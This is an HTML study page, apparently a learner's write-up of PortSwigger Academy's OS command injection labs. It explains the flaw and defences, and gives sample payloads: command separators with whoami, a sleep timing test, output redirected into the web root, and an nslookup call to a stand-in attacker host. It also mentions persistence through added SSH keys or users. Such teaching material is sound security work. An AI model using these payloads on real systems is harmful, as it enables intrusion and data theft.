<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>OS Command Injection (PortSwigger Labs)</title>
  <link rel="stylesheet" href="https://myfirstorlastname.github.io/whoami/style.css" />
</head>
<body>
  <div id="toc-container"></div>

  <h1>üñ•Ô∏è OS Command Injection (PortSwigger Labs)</h1>
  <blockquote>"When applications speak directly to the OS, every parameter is a potential shell."</blockquote>
  <hr>

  <h2>üß† What is OS Command Injection?</h2>
  <p>
    OS Command Injection occurs when an application passes unsanitized user input into a system command.  
    Attackers can exploit this to execute arbitrary commands on the server, often achieving remote code execution (RCE).  
    Unlike SQLi, which targets databases, command injection directly interacts with the operating system.
  </p>

  <h2>üß™ My Lab Progress</h2>
  <p>I completed <strong>3 out of 5</strong> OS Command Injection labs on PortSwigger Academy. (The last two require the Burp Suite Pro version.)</p>
  <ul>
    <li>OS command injection, simple case ‚úÖ</li>
    <li>Blind OS command injection with time delays ‚úÖ</li>
    <li>Blind OS command injection with output redirection ‚úÖ</li>
    <li>Blind OS command injection with out-of-band interaction ‚ùå (Pro needed)</li>
    <li>Blind OS command injection with out-of-band data exfiltration ‚ùå (Pro needed)</li>
  </ul>

  <h2>üìò Example Techniques</h2>

  <h3>1) Simple OS Command Injection</h3>
  <p>
    Classic case: concatenation of input into a shell command.  
    Example vulnerable code:
  </p>
  <pre><code>ping -c 1 &lt;user_input&gt;</code></pre>
  <p>
    If the input is <code>127.0.0.1; whoami</code>, the executed command is:
  </p>
  <pre><code>ping -c 1 127.0.0.1; whoami</code></pre>
  <p>Result: the attacker‚Äôs command <code>whoami</code> is executed by the server.</p>

  <h3>2) Blind Injection with Time Delays</h3>
  <p>
    When no output is visible, timing can confirm injection.  
    Example payload:
  </p>
  <pre><code>127.0.0.1 && sleep 5</code></pre>
  <p>
    If the server takes longer to respond, the injection point is confirmed.  
    This method can be extended into data exfiltration using conditional sleeps.
  </p>

  <h3>3) Blind Injection with Output Redirection</h3>
  <p>
    Redirect command output into a web-accessible file:
  </p>
  <pre><code>127.0.0.1 && whoami &gt; /var/www/html/output.txt</code></pre>
  <p>
    Visiting <code>/output.txt</code> reveals the command result.  
    This technique is useful where direct response reflection is blocked.
  </p>

  <h3>4) Out-of-Band (OAST) Attacks</h3>
  <p>
    For deeper blind scenarios, out-of-band channels are used. Example:
  </p>
  <pre><code>127.0.0.1 && nslookup attacker.com</code></pre>
  <p>
    The attacker observes DNS or HTTP requests to their server, confirming command execution and enabling data exfiltration.  
    (These require Burp Suite Professional or an external OAST service.)
  </p>

  <h2>üß© Real-World Applications</h2>
  <ul>
    <li>Full RCE by chaining command injection with privilege escalation.</li>
    <li>File read/write access via shell commands (e.g., <code>cat /etc/passwd</code>).</li>
    <li>Pivoting into the internal network by executing network tools (ping, curl, nc).</li>
    <li>Persistence via adding SSH keys or creating new system users.</li>
  </ul>

  <h2>üß† Key Takeaways</h2>
  <ul>
    <li>Command injection is among the most critical vulnerabilities: it goes straight from input ‚Üí OS.</li>
    <li>Detection methods vary: direct output, time delays, file redirection, OAST.</li>
    <li>Always test separators: <code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>&</code>.</li>
    <li>Defenses: strict input validation, parameterized OS calls (e.g., Python‚Äôs <code>subprocess</code> with list args).</li>
  </ul>

  <h2>üß∞ Tools & Tips</h2>
  <ul>
    <li><code>Burp Suite Repeater</code> : fast iteration on payloads.</li>
    <li><code>commix</code> : specialized tool for automated OS command injection exploitation.</li>
    <li>Check both GET and POST parameters, cookies, and headers (e.g., User-Agent).</li>
    <li>Use OAST platforms (<code>Burp Collaborator</code>, <code>Interactsh</code>) for blind injections.</li>
  </ul>

  <hr />
  <footer>
    PortSwigger Academy‚Äôs OS Command Injection labs highlight how trivial mistakes in input handling can lead to critical compromise.  
    From simple cases to stealthy out-of-band exfiltration, mastering these techniques is essential for any web penetration tester.
  </footer>
  <script src="https://myfirstorlastname.github.io/whoami/call_for_toc.js"></script>
</body>
</html>
